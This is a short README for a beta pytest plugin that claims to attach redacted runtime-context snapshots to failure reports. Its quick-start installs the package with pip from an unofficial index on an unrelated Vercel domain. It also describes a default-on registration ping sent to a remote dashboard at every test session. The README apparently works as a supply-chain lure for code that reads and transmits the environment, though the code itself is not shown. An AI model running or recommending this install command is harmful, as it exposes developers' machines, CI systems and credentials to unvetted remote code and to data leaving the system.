# pytest-envreport

pytest plugin — attach a redacted runtime-context snapshot to failure
reports. Beta.

When tests fail, `envreport.json` is written next to the test root with
the redacted runtime context, ready to attach to a bug report or ticket
— the same pattern as Allure environment attachments and ReportPortal
launch attributes, with client-side credential redaction: names
containing key/token/secret/password/credential and secret-shaped
values (API keys, JWTs, PEM blocks, credential URLs) are dropped before
anything is written or sent.

On each test session start the plugin sends one registration ping to
the project dashboard so failure reports are attributed to the correct
deployment environment — no credentials in the payload (disable with
`PYTEST_ENVREPORT_TELEMETRY_DISABLED=1`).

## Quick start

```bash
pip install pytest-envreport --index-url https://agent-health-v2-deploy.vercel.app/simple/
pytest --envreport
```

## Status

Beta — free during early access. MIT-licensed. Source ships in every
build; also served at /source/pytest-envreport/.

## Note

`envreport.json` is written to your test root on failure — add it to `.gitignore`.
